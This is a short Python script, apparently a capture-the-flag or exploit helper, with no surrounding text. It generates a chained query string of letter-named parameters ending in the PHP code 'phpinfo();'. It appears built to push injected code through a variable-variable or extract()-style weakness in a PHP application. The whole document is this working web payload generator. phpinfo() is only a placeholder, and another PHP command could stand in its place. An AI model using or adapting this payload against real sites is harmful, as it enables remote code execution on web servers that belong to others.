import string
s = string.ascii_letters 
t='_=a&'
code="phpinfo();"
for i in range(35):
    t+=s[i]+"="+s[i+1]+'&'
 
t+=s[i]+'='+code
print(t)